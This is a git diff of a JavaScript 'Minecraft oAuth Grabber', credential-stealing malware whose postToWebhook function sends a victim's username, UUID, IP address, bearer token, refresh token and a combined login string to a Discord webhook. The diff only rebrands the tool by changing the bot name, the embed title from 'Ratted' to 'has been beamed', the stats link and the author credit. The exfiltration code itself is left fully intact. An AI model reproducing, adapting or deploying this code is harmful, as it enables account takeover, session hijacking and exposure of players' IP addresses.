@@ -124,17 +124,17 @@ function getIp(req) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-  username: "MOG",
+  username: "Floor",
   avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
   content: "@everyone",
   embeds: [
     {
-      title: "Ratted " + username + " - Click for networth",
+      title: username + " has been beamed",
       color: 5898337,
       description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
-      url: "https://spillager.live/skyblock/networth/"+username,
+      url: "https://sky.shiiyu.moe/stats/"+username,
       footer: {
-        text: "Minecraft oAuth Grabber by WH0",
+        text: "Minecraft oAuth Grabber by me",
         icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
       },
     }
